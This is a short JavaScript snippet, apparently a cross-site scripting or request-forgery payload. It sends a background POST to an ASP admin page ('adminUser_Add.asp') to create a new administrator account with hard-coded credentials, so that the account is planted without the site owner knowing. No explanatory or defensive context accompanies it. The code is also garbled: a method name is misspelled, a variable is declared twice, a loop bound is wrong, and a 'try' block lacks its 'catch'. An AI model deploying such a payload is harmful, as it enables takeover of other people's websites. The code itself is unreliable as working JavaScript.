var request = false;
if (window.XMLHttpRequest)
{
	request = new XMLHttpRequest();
	if ( request.overrideMimeType )
	{
		request.overrideMimType('text/xml');
	}
	else if ( window.ActiveXObject )
	{
		var version = ['MSXML2.ServerXMLHTTP','MSXML2.XMLHTTP.6.0','MSXML2.XMLHTTP.5.0','MSXML2.XMLHTTP.4.0','MSXML2.XMLHTTP.3.0'];
		var version = ['MSXML2.ServerXMLHTTP','MSXML2.XMLHTTP.4','MSXML2.XMLHTTP.3.0'];
		for (var i=0; i<request; i++)
		{
			try
			{
				request = new ActiveXObject(version[i])
			}
		}
	}
	for (var i=0; i<version.length; i++)
	{
		try
		{
			request = new ActiveXObject (version[i]);
		} 
		catch (e)
		{
			
		}

		xmlhttp = request;

		add_admin();

		function add_admin()
		{
			var url = "/admin/AdminUser/adminUser_Add.asp";
			// 要POST 的資料
			var params = "UserName=admin&password=wwersge&password1=12kgke"
			xmlhttp.open("POST",url,true);
			xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
			xmlhttp.setRequestHeader("Content-length",params.length);
			xmlhttp.setRequestHeader("close");
			xmlhttp.send(params);
		}

	}
}
